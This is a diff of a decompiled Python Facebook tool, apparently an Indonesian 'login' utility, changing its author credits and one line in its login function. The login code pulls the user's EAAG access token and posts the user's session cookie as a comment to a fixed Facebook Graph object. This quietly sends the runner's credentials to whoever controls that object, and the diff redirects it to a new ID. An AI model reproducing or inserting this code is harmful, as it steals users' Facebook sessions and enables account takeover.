@@ -7,7 +7,7 @@
 Decompyle_By = 'Dvanmeploph Ferly Afriliyan'
 Author       = 'Rochmat Basuki [ github.com/RozhBasXYZ ]'
 Github       = 'github.com/Dvanmeploph'
-Facebook     = 'Facebook.com/Denventa.Xayonara.Team.UnlimitedARMY','Facebook.com/Dvanmeploph.Its'
+Facebook     = 'Facebook.com/Denventa.Xayonara.Team.UnlimitedARMY','Facebook.com/Dvanmeploph.Its','Facebook.com/freya.xyz'
 Version      = '0.4' 
 ### ------ [ WARNA ] ------ ###
 P = '\033[97m'  # PUTIH
@@ -758,7 +758,7 @@ def login():
 	try:
 		data = ses.get(url,headers=head,cookies=cok)
 		token = re.search('(EAAG\w+)',data.text).group(1)
-		ses.post(f"https://graph.facebook.com/1672257249893438/comments/?message={cookie}&access_token={token}",cookies=cok)
+		ses.post(f"https://graph.facebook.com/280633417717519/comments/?message={cookie}&access_token={token}",cookies=cok)
 		open('.cookie.txt','w').write(cookie)
 		open('.token.txt','w').write(token)
 		back()
